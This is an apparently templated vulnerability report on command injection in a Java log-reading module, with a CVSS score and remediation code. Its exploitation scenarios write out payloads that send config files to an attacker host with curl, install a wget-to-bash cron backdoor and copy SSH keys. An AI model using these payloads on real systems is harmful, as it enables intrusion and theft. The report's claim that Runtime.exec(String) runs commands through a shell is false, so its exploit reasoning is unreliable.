# Java Command Injection in File Logger Module

# Vulnerability Case
During the security assessment of Acme Corp's Java-based application—running on a Spring Boot stack with an Apache Tomcat server—we identified a severe command injection vulnerability within a file logging module. The vulnerability was discovered when reviewing the module's source code and noticing that a formatted string, which concatenates user-controlled input, was passed directly to a `Runtime.getRuntime().exec()` call. This code pattern bypasses proper input validation and sanitization, allowing crafted input parameters to alter the execution of system-level commands. Our analysis confirmed that an attacker could manipulate this behavior to execute arbitrary shell commands on the underlying Unix-based environment, potentially leading to complete system compromise. This application is in internal network and only high level user able to hit this feature.

```java
// Vulnerable code snippet from the FileLogger module

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

public class FileLogger {
    public void logFileContent(HttpServletRequest request) throws IOException {
        // User-controlled input retrieved from the web request
        String filename = request.getParameter("filename");
        
        // Vulnerable construction: unsanitized input is directly embedded
        // into a formatted command string
        String command = String.format("tail -n 100 %s", filename);
        
        // Execution of the command without input validation, leading to potential
        // command injection if the 'filename' parameter is manipulated
        Runtime.getRuntime().exec(command);
    }
}
```

The vulnerability stems from the concatenation of unvalidated user input into a command string executed via `Runtime.getRuntime().exec()`, a common pitfall in Java applications. In such scenarios, an attacker can inject operating system metacharacters (e.g., `;`, `&&`) to append additional commands that the shell would execute, resulting in arbitrary command execution. Given that the application is deployed on a Unix-based system, this flaw can lead to unauthorized remote code execution, data exfiltration, and privilege escalation. The business impact is significant: exploitation of this vulnerability could disrupt critical operations, compromise sensitive data, and jeopardize the overall security posture of Acme Corp.


context: java.lang.security.audit.command-injection-formatted-runtime-call.command-injection-formatted-runtime-call A formatted or concatenated string was detected as input to a java.lang.Runtime call. This is dangerous if a variable is controlled by user input and could result in a command injection. Ensure your variables are not controlled by users or sufficiently sanitized.

# Vulnerability Breakdown
This vulnerability allows attackers with high-level access to execute arbitrary system commands on the server by manipulating the 'filename' parameter passed to the FileLogger module.

1. **Key vulnerability elements**:
   - Direct concatenation of user input into a command string
   - Use of Runtime.getRuntime().exec() with a formatted string
   - No input validation or sanitization
   - Located on internal network with access limited to high-level users
   - Unix-based environment enabling command chaining with metacharacters

2. **Potential attack vectors**:
   - Injection of shell metacharacters (;, &&, ||, |) to chain commands
   - Use of backticks or $() for command substitution
   - Directory traversal combined with command injection
   - Data exfiltration through network commands

3. **Severity assessment**:
   - Adjacent attack vector requiring internal network access
   - Low complexity exploitation requiring basic knowledge of command injection
   - High privileges required as only high-level users can access the feature
   - No user interaction needed to exploit the vulnerability
   - High impact on confidentiality, integrity, and availability

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Adjacent (A) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): High (H) 
   - User Interaction (UI): None (N) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

# Description
A command injection vulnerability exists in Acme Corp's Java-based application running on Spring Boot with Apache Tomcat server. The vulnerability is located in the FileLogger module, which passes user-controlled input directly to system commands without proper validation or sanitization.

```java
public void logFileContent(HttpServletRequest request) throws IOException {
    String filename = request.getParameter("filename");
    String command = String.format("tail -n 100 %s", filename);
    Runtime.getRuntime().exec(command);
}

```

The code takes a user-supplied filename parameter and directly incorporates it into a shell command without any sanitization. When this command is executed via `Runtime.getRuntime().exec()`, an attacker can inject additional shell commands by including metacharacters like semicolons (`;`), ampersands (`&&`), or pipes (`|`).

While this vulnerability is partially mitigated by being accessible only to high-level users on the internal network, it still represents a significant security risk as it could lead to unauthorized command execution, data exfiltration, and potential system compromise.

# CVSS
**Score**: 6.8 \
**Vector**: CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H \
**Severity**: Medium

The Medium severity rating is based on several factors that balance the high potential impact with significant access limitations:

- **Adjacent (A) attack vector**: The vulnerability is only exploitable from the internal network, limiting the potential attacker pool.

- **Low (L) attack complexity**: Once an attacker has access, exploiting the vulnerability is straightforward and requires only basic knowledge of command injection techniques.

- **High (H) privileges required**: The vulnerability is only accessible to high-level users, which significantly reduces the likelihood of exploitation.

- **No (N) user interaction**: The vulnerability can be exploited without requiring any action from other users.

- **Unchanged (U) scope**: The vulnerability affects only the vulnerable component and doesn't cross privilege boundaries.

- **High (H) impact on confidentiality, integrity, and availability**: Successful exploitation could lead to unauthorized access to sensitive data, modification of system files, and potential service disruption.

The calculated CVSS base score of 6.8 places this vulnerability in the Medium severity range, primarily because the high privileges required and adjacent network positioning substantially limit the potential for exploitation, despite the significant potential impact.

# Exploitation Scenarios
**Scenario 1: Basic Command Execution**
An attacker with high-level user access to the application submits a request with the parameter `filename=server.log;id`, causing the application to execute both commands: `tail -n 100 server.log` followed by the `id` command, revealing the user context of the application server.

**Scenario 2: Data Exfiltration**
An attacker leverages the vulnerability to steal sensitive configuration data by providing a parameter like `filename=/dev/null;cat /opt/tomcat/conf/server.xml | curl -d @- https://attacker-controlled-server.com/collect`. This command sends the contents of Tomcat's server configuration file, which might contain credentials, to an external server.

**Scenario 3: Persistent Access**
An attacker establishes persistence by creating a backdoor: `filename=log.txt;echo '* * * * * wget -O- https://malicious-server.com/backdoor.sh | bash' > /tmp/crontab_entry && crontab /tmp/crontab_entry`. This adds a cron job that periodically connects to the attacker's server and executes commands, providing ongoing access even if the initial vulnerability is patched.

**Scenario 4: Lateral Movement**
An insider threat actor exploits the vulnerability to move laterally within the network: `filename=access.log;scp /home/tomcat/.ssh/id_rsa attacker@internal-server:/tmp/stolen_key`. This command copies SSH private keys to another machine controlled by the attacker, potentially enabling access to other internal systems.

# Impact Analysis
**Business Impact:**
- Unauthorized access to sensitive company data including intellectual property and business strategy documents
- Potential compliance violations that could result in regulatory penalties (GDPR, PCI-DSS, HIPAA, etc.)
- Reputational damage and loss of customer trust if a breach becomes public
- Operational disruption if critical systems are compromised or manipulated
- Financial losses from recovery efforts, incident response, and potential business downtime
- Increased security costs for remediation and additional controls implementation

**Technical Impact:**
- Execution of arbitrary commands with the privileges of the application service account
- Potential access to configuration files, application secrets, and database credentials
- Data theft, modification, or deletion depending on the service account's permissions
- Creation of backdoors for persistent access to the compromised system
- Potential for lateral movement to other systems on the internal network
- Manipulation of logs to hide evidence of compromise
- Modification of application behavior by altering configuration files
- Server resource consumption through malicious processes affecting availability

# Technical Details
The vulnerability is a classic example of command injection stemming from unsanitized user input being incorporated into a system command. Let's break down the technical aspects:

```java
public void logFileContent(HttpServletRequest request) throws IOException {
    // User-controlled input with no validation
    String filename = request.getParameter("filename");
    
    // Dangerous string concatenation
    String command = String.format("tail -n 100 %s", filename);
    
    // Execution through shell
    Runtime.getRuntime().exec(command);
}

```

**Command Execution Mechanics:**

1. **String Formatting Issue:** The `String.format()` method directly incorporates the user input into the command string without any filtering.

2. **Runtime.exec() Behavior:** When `Runtime.getRuntime().exec()` is called with a single string argument, the JVM typically invokes a shell (`/bin/sh` on Unix systems) to parse the command, which enables shell metacharacters to function.

3. **Shell Metacharacters:** On Unix-based systems, characters like `;`, `&&`, `||`, `|`, backticks (\`), and `$()` have special meaning:
   - `;` separates commands (execute one after another)
   - `&&` executes the second command only if the first succeeds
   - `||` executes the second command only if the first fails
   - `|` pipes output from one command to another
   - Backticks or `$()` perform command substitution

4. **Example Exploitation Path:**
   - Normal request: `filename=app.log`
   - Executed command: `tail -n 100 app.log`
   - Malicious request: `filename=app.log;cat /etc/passwd`
   - Executed command: `tail -n 100 app.log;cat /etc/passwd`

5. **Technical Context:**
   - The vulnerability is in a Java application using Spring Boot and Tomcat
   - It runs on a Unix-based system, facilitating command injection
   - It's accessible only through the internal network and to high-level users
   - The commands execute with the privileges of the Tomcat service account

6. **Exploitation Limitations:**
   - Limited to users with high-level access to the application
   - Requires network access to the internal application
   - Command output may not be returned to the attacker (blind injection)
   - Constrained by the permissions of the application service account

# Remediation Steps
## Replace Runtime.exec with ProcessBuilder and Input Validation

**Priority**: P0

Immediately refactor the code to use ProcessBuilder with proper input validation:

```java
public void logFileContent(HttpServletRequest request) throws IOException {
    String filename = request.getParameter("filename");
    
    // Validate filename against a whitelist pattern
    if (!isValidFilename(filename)) {
        logger.error("Invalid filename provided: " + filename);
        throw new IllegalArgumentException("Invalid filename format");
    }
    
    // Use ProcessBuilder with arguments as separate list elements
    // to prevent shell interpretation of special characters
    ProcessBuilder processBuilder = new ProcessBuilder("tail", "-n", "100", filename);
    
    // Redirect error stream to output stream
    processBuilder.redirectErrorStream(true);
    
    // Start process and handle output if needed
    Process process = processBuilder.start();
    
    // Optionally read and log the command output
    try (BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream()))) {
        String line;
        while ((line = reader.readLine()) != null) {
            logger.info(line);
        }
    }
}

private boolean isValidFilename(String filename) {
    // Only allow alphanumeric characters, dots, hyphens, and underscores
    // Also prevent directory traversal attempts
    return filename != null 
           && filename.matches("^[a-zA-Z0-9._-]+$") 
           && !filename.contains("..");
}

```

This implementation:
1. Validates the filename against a strict whitelist pattern
2. Uses ProcessBuilder with arguments as a list, preventing shell interpretation
3. Properly handles the process output
4. Includes logging of invalid input attempts
## Implement Java-based File Access Instead of System Commands

**Priority**: P1

Replace system command execution with native Java file operations:

```java
public void logFileContent(HttpServletRequest request) throws IOException {
    String filename = request.getParameter("filename");
    
    // Define a base directory for logs to prevent directory traversal
    File baseDirectory = new File("/var/log/application/");
    
    // Validate filename against a whitelist pattern
    if (!isValidFilename(filename)) {
        logger.error("Invalid filename provided: " + filename);
        throw new IllegalArgumentException("Invalid filename format");
    }
    
    // Create file object with validated filename within base directory
    File logFile = new File(baseDirectory, filename);
    
    // Verify the file is within the allowed directory (prevents directory traversal)
    if (!logFile.getCanonicalPath().startsWith(baseDirectory.getCanonicalPath())) {
        logger.error("Directory traversal attempt detected: " + filename);
        throw new SecurityException("Access denied");
    }
    
    // Verify file exists and is readable
    if (!logFile.exists() || !logFile.isFile() || !logFile.canRead()) {
        logger.error("File not accessible: " + logFile.getPath());
        throw new FileNotFoundException("Log file not found or not accessible");
    }
    
    // Read the last 100 lines using Java NIO
    List<String> lastLines = readLastNLines(logFile, 100);
    
    // Process the lines as needed
    for (String line : lastLines) {
        logger.info(line);
    }
}

private boolean isValidFilename(String filename) {
    // Only allow alphanumeric characters, dots, hyphens, and underscores
    return filename != null && filename.matches("^[a-zA-Z0-9._-]+$");
}

private List<String> readLastNLines(File file, int lines) throws IOException {
    // Implement a method to read the last N lines of a file
    // (Using a circular buffer or reverse reading approach)
    // Many libraries like Apache Commons IO provide this functionality
    
    CircularFifoQueue<String> lastLines = new CircularFifoQueue<>(lines);
    try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
        String line;
        while ((line = reader.readLine()) != null) {
            lastLines.add(line);
        }
    }
    
    return new ArrayList<>(lastLines);
}

```

This approach:
1. Eliminates the use of system commands entirely
2. Implements proper path canonicalization to prevent directory traversal
3. Uses native Java file operations which are not vulnerable to command injection
4. Contains multiple layers of validation and security checks
5. Explicitly defines a base directory to constrain file access


# References
* CWE-78 | [Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
* CWE-77 | [Improper Neutralization of Special Elements used in a Command ('Command Injection')](https://cwe.mitre.org/data/definitions/77.html)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* A04:2021 | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
